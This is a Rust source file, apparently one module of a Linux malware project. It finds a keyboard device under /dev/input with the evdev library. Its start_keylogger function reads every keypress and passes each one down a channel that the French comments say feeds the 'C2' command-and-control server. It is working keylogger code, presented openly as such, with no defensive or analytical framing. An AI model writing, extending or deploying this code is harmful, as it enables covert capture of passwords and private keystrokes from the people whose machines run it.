use evdev::{Device, EventType, Key};
use std::sync::mpsc::Sender;

/// ✅ Détection automatique clavier
pub fn detect_keyboard_device() -> Option<String> {
    for entry in std::fs::read_dir("/dev/input").unwrap() {
        let path = entry.unwrap().path();
        if path.to_str().unwrap().contains("event") {
            if let Ok(dev) = evdev::Device::open(&path) {
                if let Some(name) = dev.name() { 
                    if name.to_lowercase().contains("keyboard") || name.to_lowercase().contains("kbd") {
                        return Some(path.to_str().unwrap().to_string());
                    }
                }
            }
        }
    }
    None
}

/// ✅ Keylogger : lit les frappes et envoie chaque ligne (avec \n) au C2
pub fn start_keylogger(device: &str, tx: Sender<String>) {
    let mut dev = Device::open(device).unwrap();

    loop {
        for ev in dev.fetch_events().unwrap() {
            if ev.event_type() == EventType::KEY {
                let key = Key::new(ev.code());
                let value = ev.value();

                if value == 1 {
                    let msg = format!("[*] Touche détectée : {:?}\n", key); // ✅ Ajoute \n directement ici
                    println!("{}", msg.trim_end()); // Affiche sans le \n

                    let _ = tx.send(msg); // ✅ Envoie avec \n => débloque le C2
                }
            }
        }
    }
}
